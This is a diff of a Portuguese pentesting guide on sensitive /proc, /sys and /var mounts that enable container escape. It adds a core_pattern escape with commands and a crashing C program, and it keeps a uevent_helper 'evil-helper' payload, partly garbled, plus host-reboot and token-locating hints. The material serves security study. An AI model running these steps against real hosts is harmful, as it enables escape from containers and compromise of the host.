@@ -15,16 +15,28 @@ Este diretório permite o acesso para modificar variáveis do kernel, geralmente
 #### **`/proc/sys/kernel/core_pattern`**
 
 - Descrito em [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Permite definir um programa a ser executado na geração de arquivos de core, com os primeiros 128 bytes como argumentos. Isso pode levar à execução de código se o arquivo começar com um pipe `|`.
+- Se você puder escrever dentro deste arquivo, é possível escrever um pipe `|` seguido pelo caminho para um programa ou script que será executado após uma falha.
+- Um atacante pode encontrar o caminho dentro do host para seu contêiner executando `mount` e escrever o caminho para um binário dentro do sistema de arquivos de seu contêiner. Em seguida, causar uma falha em um programa para fazer o kernel executar o binário fora do contêiner.
+
 - **Exemplo de Teste e Exploração**:
-
 ```bash
-[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Testar acesso de escrita
+[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
 cd /proc/sys/kernel
-echo "|$overlay/shell.sh" > core_pattern # Definir manipulador personalizado
-sleep 5 && ./crash & # Acionar manipulador
+echo "|$overlay/shell.sh" > core_pattern # Set custom handler
+sleep 5 && ./crash & # Trigger handler
 ```
+Verifique [este post](https://pwning.systems/posts/escaping-containers-for-fun/) para mais informações.
 
+Exemplo de programa que trava:
+```c
+int main(void) {
+char buf[1];
+for (int i = 0; i < 100; i++) {
+buf[i] = 1;
+}
+return 0;
+}
+```
 #### **`/proc/sys/kernel/modprobe`**
 
 - Detalhado em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
@@ -38,20 +50,20 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Verificar acesso ao modprobe
 #### **`/proc/sys/vm/panic_on_oom`**
 
 - Referenciado em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-- Uma flag global que controla se o kernel entra em pânico ou invoca o OOM killer quando ocorre uma condição de OOM.
+- Uma flag global que controla se o kernel entra em pânico ou invoca o OOM killer quando uma condição de OOM ocorre.
 
 #### **`/proc/sys/fs`**
 
-- Conforme [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contém opções e informações sobre o sistema de arquivos.
-- O acesso de escrita pode permitir vários ataques de negação de serviço contra o host.
+- De acordo com [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contém opções e informações sobre o sistema de arquivos.
+- O acesso de gravação pode permitir vários ataques de negação de serviço contra o host.
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
 - Permite registrar interpretadores para formatos binários não nativos com base em seu número mágico.
-- Pode levar à escalada de privilégios ou acesso a shell root se `/proc/sys/fs/binfmt_misc/register` for gravável.
+- Pode levar à escalada de privilégios ou acesso ao shell root se `/proc/sys/fs/binfmt_misc/register` for gravável.
 - Exploit relevante e explicação:
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
-- Tutorial aprofundado: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
+- Tutorial detalhado: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
 ### Outros em `/proc`
 
@@ -71,13 +83,13 @@ echo b > /proc/sysrq-trigger # Reinicializa o host
 
 #### **`/proc/kmsg`**
 
-- Exibe mensagens do buffer de anel do kernel.
-- Pode ajudar em exploits do kernel, vazamentos de endereços e fornecer informações sensíveis do sistema.
+- Expõe mensagens do buffer de anel do kernel.
+- Pode ajudar em exploits de kernel, vazamentos de endereços e fornecer informações sensíveis do sistema.
 
 #### **`/proc/kallsyms`**
 
 - Lista símbolos exportados do kernel e seus endereços.
-- Essencial para o desenvolvimento de exploits do kernel, especialmente para superar KASLR.
+- Essencial para o desenvolvimento de exploits de kernel, especialmente para superar KASLR.
 - As informações de endereço são restritas com `kptr_restrict` definido como `1` ou `2`.
 - Detalhes em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
@@ -85,11 +97,11 @@ echo b > /proc/sysrq-trigger # Reinicializa o host
 
 - Interface com o dispositivo de memória do kernel `/dev/mem`.
 - Historicamente vulnerável a ataques de escalada de privilégios.
-- Mais sobre [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Mais em [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/kcore`**
 
-- Representa a memória física do sistema em formato ELF core.
+- Representa a memória física do sistema no formato ELF core.
 - A leitura pode vazar conteúdos de memória do sistema host e de outros contêineres.
 - O grande tamanho do arquivo pode levar a problemas de leitura ou falhas de software.
 - Uso detalhado em [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
@@ -97,29 +109,29 @@ echo b > /proc/sysrq-trigger # Reinicializa o host
 #### **`/proc/kmem`**
 
 - Interface alternativa para `/dev/kmem`, representando a memória virtual do kernel.
-- Permite leitura e escrita, portanto, modificação direta da memória do kernel.
+- Permite leitura e gravação, portanto, modificação direta da memória do kernel.
 
 #### **`/proc/mem`**
 
 - Interface alternativa para `/dev/mem`, representando a memória física.
-- Permite leitura e escrita, a modificação de toda a memória requer a resolução de endereços virtuais para físicos.
+- Permite leitura e gravação, a modificação de toda a memória requer a resolução de endereços virtuais para físicos.
 
 #### **`/proc/sched_debug`**
 
 - Retorna informações de agendamento de processos, contornando as proteções do namespace PID.
-- Exibe nomes de processos, IDs e identificadores de cgroup.
+- Expõe nomes de processos, IDs e identificadores de cgroup.
 
 #### **`/proc/[pid]/mountinfo`**
 
 - Fornece informações sobre pontos de montagem no namespace de montagem do processo.
-- Exibe a localização do `rootfs` ou imagem do contêiner.
+- Expõe a localização do `rootfs` ou imagem do contêiner.
 
-### Vulnerabilidades do `/sys`
+### Vulnerabilidades em `/sys`
 
 #### **`/sys/kernel/uevent_helper`**
 
 - Usado para manipular `uevents` de dispositivos do kernel.
-- Escrever em `/sys/kernel/uevent_helper` pode executar scripts arbitrários ao acionar `uevent`.
+- Gravar em `/sys/kernel/uevent_helper` pode executar scripts arbitrários ao serem acionados `uevent`.
 - **Exemplo de Exploração**: %%%bash
 
 #### Cria um payload
@@ -130,7 +142,7 @@ echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /ev
 
 host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)
 
-#### Define uevent_helper para o helper malicioso
+#### Define uevent_helper para helper malicioso
 
 echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
 
@@ -157,17 +169,17 @@ cat /output %%%
 
 #### **`/sys/firmware/efi/vars` e `/sys/firmware/efi/efivars`**
 
-- Expondo interfaces para interagir com variáveis EFI na NVRAM.
-- A má configuração ou exploração pode levar a laptops brickados ou máquinas host não inicializáveis.
+- Expõe interfaces para interagir com variáveis EFI na NVRAM.
+- Configuração inadequada ou exploração pode levar a laptops brickados ou máquinas host não inicializáveis.
 
 #### **`/sys/kernel/debug`**
 
 - `debugfs` oferece uma interface de depuração "sem regras" para o kernel.
 - Histórico de problemas de segurança devido à sua natureza irrestrita.
 
-### Vulnerabilidades do `/var`
+### Vulnerabilidades em `/var`
 
-A pasta **/var** do host contém sockets de tempo de execução do contêiner e os sistemas de arquivos dos contêineres. Se esta pasta for montada dentro de um contêiner, esse contêiner terá acesso de leitura e gravação aos sistemas de arquivos de outros contêineres com privilégios de root. Isso pode ser abusado para pivotar entre contêineres, causar uma negação de serviço ou backdoor em outros contêineres e aplicativos que são executados neles.
+A pasta **/var** do host contém sockets de tempo de execução de contêiner e os sistemas de arquivos dos contêineres. Se esta pasta estiver montada dentro de um contêiner, esse contêiner terá acesso de leitura e gravação aos sistemas de arquivos de outros contêineres com privilégios de root. Isso pode ser abusado para pivotar entre contêineres, causar uma negação de serviço ou backdoor em outros contêineres e aplicativos que rodam neles.
 
 #### Kubernetes
 
@@ -253,7 +265,7 @@ drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044
 ```
 #### Nota
 
-Os caminhos reais podem diferir em diferentes configurações, por isso a melhor opção é usar o comando **find** para localizar os sistemas de arquivos de outros contêineres e tokens de identidade SA / web.
+Os caminhos reais podem diferir em diferentes configurações, por isso sua melhor aposta é usar o comando **find** para localizar os sistemas de arquivos de outros contêineres e tokens de identidade SA / web.
 
 ### Referências
 
